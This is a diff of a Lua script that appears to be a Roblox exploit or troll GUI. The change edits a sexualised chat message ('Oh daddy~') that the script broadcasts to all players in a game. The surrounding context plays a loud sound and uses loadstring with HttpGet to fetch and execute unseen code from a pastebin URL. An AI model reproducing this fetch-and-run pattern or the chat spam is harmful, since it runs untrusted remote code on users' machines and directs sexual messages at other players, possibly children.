@@ -515,7 +515,7 @@ ERP.Button({
         sound2.SoundId = "rbxassetid://998971542"
         sound2.Volume = 10
         sound2:Play()
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Oh yes daddy~", "All")
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Oh daddy~", "All")
     
     loadstring(game:HttpGet(('https://pastebin.com/raw/r3kLtDtw'),true))();
     sound2:Destroy()
